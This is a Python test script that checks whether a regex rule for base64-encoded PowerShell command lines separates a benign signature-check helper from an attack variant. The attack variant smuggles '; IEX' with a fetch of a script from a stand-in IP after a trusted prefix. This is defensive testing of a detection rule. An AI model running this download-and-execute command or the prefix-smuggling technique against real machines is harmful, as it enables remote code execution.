import base64, re

# char-class "fix" candidate appended after the 112-char anchor, as proposed
anchor = 'RwBlAHQALQBBAHUAdABoAGUAbgB0AGkAYwBvAGQAZQBTAGkAZwBuAGEAdAB1AHIAZQAgAC0ATABpAHQAZQByAGEAbABQAGEAdABoACAAQAAoACcA'
FIX_RX = re.compile(r'(?i)^\s*"?[^\s"]*powershell(\.exe)?"?\s+-noprofile\s+-encodedcommand\s+' + anchor + r'[^\x60;>]*$')

def enc(s):
    return base64.b64encode(s.encode('utf-16-le')).decode()

benign = "Get-AuthenticodeSignature -LiteralPath @('C:\\Windows\\notepad.exe','C:\\Windows\\system32\\kernel32.dll')"
attack = "Get-AuthenticodeSignature -LiteralPath @('C:\\Windows\\notepad.exe'); IEX(http://203.0.113.9/p.ps1)"

for name, payload in [("BENIGN real helper (must still QUIET)", benign),
                      ("ATTACK prefix + '; IEX' (must be ARMED)", attack)]:
    cmd = 'powershell -NoProfile -EncodedCommand ' + enc(payload)
    print(f"char-class fix matches: {str(bool(FIX_RX.match(cmd))):5} | {name}")
    print(f"   tail after anchor (cmdline bytes): {cmd[-40:]!r}")
